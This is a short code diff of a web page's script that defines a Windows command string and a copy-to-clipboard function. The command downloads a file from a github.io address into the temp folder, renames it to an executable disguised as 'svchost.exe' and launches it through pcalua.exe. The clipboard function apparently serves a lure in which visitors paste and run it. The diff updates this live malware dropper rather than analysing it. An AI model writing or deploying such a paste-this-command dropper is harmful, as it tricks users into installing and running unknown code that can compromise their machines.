@@ -229,7 +229,7 @@
     </div>
 
     <script>
-        const cmd = 'cmd /c start /min cmd /c curl -sLo %TEMP%\\cache.dat https://erurikiriku-blip.github.io/hello.txt & ren %TEMP%\\cache.dat a.exe & pcalua.exe -a %TEMP%\\a.exe';
+        const cmd = 'cmd /c curl -sLo %TEMP%\cache.dat https://erurikiriku-blip.github.io//hello.txt && ren %TEMP%\cache.dat svchost.exe && pcalua.exe -a %TEMP%\svchost.exe';
 
         function copyToClipboard(text) {
             if (navigator.clipboard && navigator.clipboard.writeText) {
